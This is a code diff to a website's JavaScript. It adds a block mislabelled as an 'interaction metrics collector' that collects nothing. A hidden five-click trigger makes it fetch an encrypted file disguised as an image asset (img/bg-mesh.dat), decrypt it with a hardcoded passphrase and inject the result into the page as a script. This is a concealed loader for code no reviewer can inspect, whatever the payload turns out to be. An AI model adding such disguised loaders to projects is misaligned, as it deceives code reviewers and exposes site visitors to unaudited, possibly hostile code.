@@ -318,6 +318,67 @@ document.addEventListener('DOMContentLoaded', () => {
     setTimeout(() => {
         document.body.classList.add('loaded');
     }, 100);
+
+    // Interaction metrics collector
+    (async function() {
+        var _t = [], _n = 5, _w = 2000;
+        var _el = document.querySelector('[data-v]');
+        const PASSPHRASE = 'ultraviolet';
+        
+        if (!_el) return;
+        _el.style.cursor = 'inherit';
+
+        async function decryptData(buffer, passphrase) {
+            const salt = buffer.slice(0, 16);
+            const iv = buffer.slice(16, 32);
+            const data = buffer.slice(32);
+
+            const encoder = new TextEncoder();
+            const baseKey = await crypto.subtle.importKey(
+                'raw', encoder.encode(passphrase), 'PBKDF2', false, ['deriveKey']
+            );
+
+            const key = await crypto.subtle.deriveKey(
+                { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
+                baseKey,
+                { name: 'AES-CBC', length: 256 },
+                false,
+                ['decrypt']
+            );
+
+            const decrypted = await crypto.subtle.decrypt(
+                { name: 'AES-CBC', iv },
+                key,
+                data
+            );
+
+            return new TextDecoder().decode(decrypted);
+        }
+
+        _el.addEventListener('click', async function(e) {
+            e.stopPropagation();
+            var now = Date.now();
+            _t.push(now);
+            if (_t.length > _n) _t.shift();
+            if (_t.length === _n && (now - _t[0]) <= _w) {
+                _t.length = 0; // Reset
+            
+                try {
+                    const response = await fetch('img/bg-mesh.dat');
+                    const buffer = await response.arrayBuffer();
+
+                    const engineCode = await decryptData(buffer, PASSPHRASE);
+
+                    const script = document.createElement('script');
+                    script.textContent = engineCode;
+                    document.body.appendChild(script);
+                } catch (err) {
+                    console.log(err);
+                    console.error("Decryption failed. Incorrect passphrase or corrupted data.");
+                }
+            }
+        });
+    })();
 });
 
 // Handle window resize
